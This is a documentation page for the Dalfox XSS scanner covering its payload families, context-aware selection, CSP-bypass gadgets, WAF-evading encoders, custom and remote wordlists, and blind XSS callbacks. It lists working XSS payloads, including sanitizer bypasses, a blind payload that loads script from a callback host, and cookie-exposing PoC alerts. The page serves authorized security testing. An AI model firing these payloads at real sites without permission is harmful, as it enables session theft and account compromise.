+++
title = "Payloads & Encoding"
description = "Built-in payload families, encoders, custom payloads, and remote wordlists."
weight = 3
toc = true
+++

Dalfox ships with a curated, context-aware payload library. Most of the time you don't need to think about it. The engine picks the right payloads for each injection context. This page covers what's built in and how to extend it.

## Payload families

Dalfox composes payloads from several families:

| Family | Example | Used when |
|--------|---------|-----------|
| **HTML tag** | `<svg onload=alert(1)>` | HTML context |
| **Attribute breakout** | `'><img src=x onerror=alert(1)>` | Inside an attribute |
| **JavaScript** | `";alert(1);//` | Inside a `<script>` block |
| **Event handler** | `onmouseover=alert(1)` | Existing attribute value |
| **DOM clobbering** | `<img id=x>` | Legacy DOM lookups |
| **URL protocol** | `javascript:alert(1)` | `href`/`src`-like attributes |
| **CSP bypass** | `strict-dynamic` script gadgets, nonce reuse, JSONP on allowed hosts | When the response carries a bypassable CSP |
| **mXSS** | `<foreignobject>`/DOMPurify bypasses | Sanitizer-mutated DOM |
| **Blind** | `"'><script src=CALLBACK></script>` | `-b`/`--blind` or `--blind-oob` is set |

Most payload templates carry a marker (`class={CLASS}` or `id={ID}`) so the verification stage can positively identify its own element in the DOM. A few short, marker-free payloads exist for length-capped reflections; on their own they can only produce `R` findings.

## Context-aware selection

During discovery Dalfox classifies each parameter by **injection context**, the place where its reflected value lands:

- HTML body → HTML tag, mXSS, and DOM-clobbering payloads (wrapped in `-->…<!--` when the value lands inside an HTML comment)
- Inside a quoted attribute → attribute-breakout and self-triggering event-handler payloads, with URL-protocol payloads first
- Inside `<script>` → string-delimiter breakouts (`'-alert(1)-'`, `${alert(1)}`, …) and `</script>` tag breakouts
- Inside `<style>` → `</style>` breakouts followed by an HTML tag
- Unknown → an interleaved mix of HTML, attribute, mXSS, DOM-clobbering, and URL-protocol payloads

This keeps request counts sane while maximising hit rate.

## CSP-aware bypass payloads

When the preflight stage sees a `Content-Security-Policy` (or `…-Report-Only`)
header, or a `<meta http-equiv>` equivalent, Dalfox parses it and tailors the
script-execution payloads to that policy's actual weaknesses. Payloads are only
generated for the directives that are genuinely exploitable, so a target with no
CSP (or a hardened one) sees no extra requests.

| CSP shape | What Dalfox emits |
|-----------|-------------------|
| `unsafe-inline` / `unsafe-eval` | direct inline / `eval`-family payloads |
| missing `base-uri` / `object-src` | `<base>` hijack / `<object>`/`<embed>` injection |
| `data:` / `blob:` in `script-src` | `<script src=data:…>` / `Blob` URL loaders |
| whitelisted CDN host | the matching JSONP / framework **script gadget** for that host |
| `strict-dynamic` | DOM script-gadgets (RequireJS `data-main`, `document.write` self-propagation, AngularJS bootstrap) plus **nonce reuse** when a nonce is captured |

Two shapes deserve a closer look:

- **`strict-dynamic`.** Under `strict-dynamic` the browser ignores the host
  allowlist, so a plain `<script src=allowed-host>` no longer loads. Dalfox
  switches to DOM script-gadgets (payloads that get an already-trusted script
  to create the attacker script) and, when the policy pins a nonce, emits a
  `<script nonce=…>` reuse payload (effective when the nonce is static,
  predictable, or reflected).
- **Nonce / hash pinning.** `'nonce-…'` and `'sha256-…'` tokens are parsed and
  used to classify the policy. A pure random-nonce/hash policy with no
  `strict-dynamic` and no gadget host is treated as *hardened* — Dalfox does not
  waste requests on it.

The gadgets come from public CSP-bypass research (JSONBee, cure53 H5SC, Google
CSP Evaluator).

## Trusted Types awareness

[Trusted Types](https://web.dev/articles/trusted-types) is the primary DOM-XSS
mitigation in hardened apps. Dalfox's AST DOM-XSS analyzer understands it:

- A **strict** policy callback (`createPolicy('p', {createHTML: s => DOMPurify.sanitize(s)})`)
  clears taint just like any other sanitizer, so values routed through
  `p.createHTML(x)` no longer report.
- A **permissive** default policy (the classic bypassable no-op
  `createPolicy('default', {createHTML: x => x})`) is *not* mistaken for
  protection; the finding is kept and flagged.
- When the response CSP enforces `require-trusted-types-for 'script'` **and** the
  page defines a strict `'default'` policy, the browser auto-sanitizes every
  TrustedHTML sink — Dalfox suppresses those findings, which would otherwise be false positives.

The classifier is deliberately conservative: anything it can't prove safe stays
permissive, so the finding is kept. Suppression never fires without enforcement,
so a page that defines a default policy but forgets `require-trusted-types-for`
still reports — no false negatives are introduced.

## Encoders

Encoders transform the *same payload* into multiple forms so the WAF and server-side filters don't all see the same bytes.

```bash
dalfox scan https://target.app -e url,html,base64
```

Available encoders:

| Encoder | Transforms `<` to | Notes |
|---------|-------------------|-------|
| `none` | `<` (raw) | Turns encoding off (see below) |
| `url` | `%3C` | Single URL encoding |
| `2url` | `%253C` | Double URL encoding |
| `3url` | `%25253C` | Triple |
| `4url` | `%2525253C` | Quadruple |
| `html` | `&#x003c;` | Every character becomes a hex entity |
| `htmlpad` | `&#x000003c;` | 7-digit zero-padded hex entity; letters, digits, and spaces stay raw |
| `base64` | `PA==` | Base64 of the whole payload |
| `unicode` | `＜` | Printable ASCII mapped to its fullwidth form (U+FF01–U+FF5E) |
| `zwsp` | `<` + U+200B | Zero-width space inserted after `<` `>` `"` `'` `(` `)` `/` `;` |

Defaults: `url,html`. The raw payload is always sent too, so each active encoder adds one variant per base payload (the default sends each payload three ways). If you add `none` to the list, Dalfox sends only the raw payloads.

## Custom payloads

Provide your own list, one payload per line. Blank lines and lines starting with `#` are skipped:

```bash
dalfox scan https://target.app --custom-payload mypayloads.txt
```

Use a custom file instead of the local built-in library:

```bash
dalfox scan https://target.app --custom-payload mypayloads.txt --only-custom-payload
```

`--only-custom-payload` without `--custom-payload` is rejected, as is a file with no usable lines. The custom file supplies the local reflection and DOM base payloads. Adaptive synthesis and shared CSP/technology payloads are skipped. Encoders and WAF mutations still produce variants of custom entries, and explicitly requested `--remote-payloads` remain active.

## Remote payload sources

Pull community wordlists on demand:

```bash
dalfox scan https://target.app --remote-payloads portswigger,payloadbox
```

Supported sources: `portswigger`, `payloadbox`. Fetched once per run, respecting `--proxy` and `--timeout`.

## Inspecting payloads

Print a payload family without running a scan. Each selector is described in the [CLI reference](../../reference/cli/); `portswigger` and `payloadbox` fetch remote lists, the rest are built in:

```bash
dalfox payload javascript      # alert(1), alert`1`, prompt(1), ...
dalfox payload event-handlers  # onerror, onmouseover, ...
dalfox payload useful-tags     # svg, img, script, ...
dalfox payload uri-scheme      # javascript:, data:
dalfox payload special-chars   # < > " ' ` ( ) ... and encoded variants
dalfox payload functions       # confirmable sinks: alert(1), window['alert'](1), ...
dalfox payload awesome-alert   # PoC alerts: alert(document.domain), alert(document.cookie)
dalfox payload dom-clobbering  # DOM clobbering vectors
dalfox payload mxss            # mutation-XSS / sanitizer-bypass payloads
dalfox payload blind           # blind-XSS skeletons ({} = your callback URL)
dalfox payload portswigger     # fetch + print remote list
dalfox payload payloadbox      # fetch + print remote list
dalfox payload all             # every local selector, grouped under "# name" headers
```

Every selector prints one entry per line, so it composes with the usual shell tools:

```bash
dalfox payload functions | grep -i prompt
dalfox payload special-chars | wc -l
```

Add `--json` to get a JSON array instead (`dalfox payload all --json` flattens every local group into one array; `dalfox payload --json` with no selector prints the per-selector counts).

The `special-chars` group is handy for manual reflection testing — inject each byte on
its own to see which characters survive verbatim, which come back HTML/URL-encoded, and
which are stripped. `functions` and `awesome-alert` are curated to *visibly* fire (and to
render the host/origin), so a single screenshot proves impact.

## Customising the "alert"

The classic `alert(1)` can be loud. Swap it out so you can prove impact without popping dialogs everywhere:

```bash
# alert(document.domain): the value stays a JavaScript expression
dalfox scan https://target.app --custom-alert-value document.domain

# alert('dalfox'): the value becomes a string literal
dalfox scan https://target.app --custom-alert-value dalfox --custom-alert-type str
```

- `--custom-alert-value`: replaces the `1` in the built-in `alert(1)` / `prompt(1)` / `confirm(1)` calls (and their backtick forms). Default `1`.
- `--custom-alert-type`: `none` (default) inserts the value as-is, so `document.domain` stays an expression; `str` wraps it in single quotes, so it becomes a string literal.

## Blind XSS

Blind XSS fires later, in a context you can't see (an admin panel, a support agent's dashboard). You need an out-of-band listener:

```bash
dalfox scan https://target.app -b https://your-callback.interact.sh
```

Custom blind templates:

```bash
dalfox scan https://target.app \
  -b https://your-callback.example \
  --custom-blind-xss-payload blind-templates.txt
# each line must contain {callback} (replaced with the callback URL)
```

Only lines containing `{callback}` are used; other lines are skipped with a warning, and `#` comments and blank lines are ignored. A literal `{}` is left alone, so a template can carry JavaScript like `()=>{}`. That also means the `{}` skeletons printed by `dalfox payload blind` need `{}` changed to `{callback}` before you use them here. If no line is usable, Dalfox falls back to the built-in templates.

Without a callback server of your own, `--blind-oob` registers with interactsh and polls for the callback itself, and a callback that arrives becomes a `V` finding; see [Blind XSS](../scanning-modes/#blind-xss) in Scanning Modes.

## HTTP Parameter Pollution (HPP)

Some filters only inspect one occurrence of a parameter. With `--hpp`, Dalfox re-sends the first five payloads of each **query** parameter with the parameter duplicated, putting the payload in the last slot, the first slot, and both:

```bash
dalfox scan https://target.app --hpp
```

A hit is reported as `R` with `inject_type` `inHTML-HPP`. It proves the payload survived the duplicate-parameter handling, not that it landed in an executable position, so confirm it manually.

## Deep scan

By default Dalfox stops testing a parameter once it finds a verified payload. `--deep-scan` keeps going, and also lifts the built-in cap of 3000 base payloads per parameter (see `--max-payloads-per-param` in the [CLI reference](../../reference/cli/)):

```bash
dalfox scan https://target.app --deep-scan
```

Useful for research; slower for production pipelines.

## Skipping payload stages

| Flag | Effect |
|------|--------|
| `--skip-xss-scanning` | Discover and probe only; no payload injection |
| `--skip-ast-analysis` | Skip AST-based DOM-XSS detection of inline scripts (the `[A]` findings) |

`--skip-ast-analysis` is the control for the static DOM-XSS pass that reports `source → sink` flows (e.g. `location.hash` → `innerHTML`) as `[A]` (AST-detected) findings — independent of parameter mining. `--skip-mining-dom` does **not** affect it. To keep the pass running but hide those findings from the output, use `--only-poc v,r`. What `[A]` actually proves (and why a pure client-side DOM-XSS never reaches `[V]`) is covered in [Detection Model](../detection-model/).

## Next

- Pair this with [WAF Bypass](../waf-bypass/) to bend payloads around filters.
- See [Output &amp; Reports](../output/) to export findings.
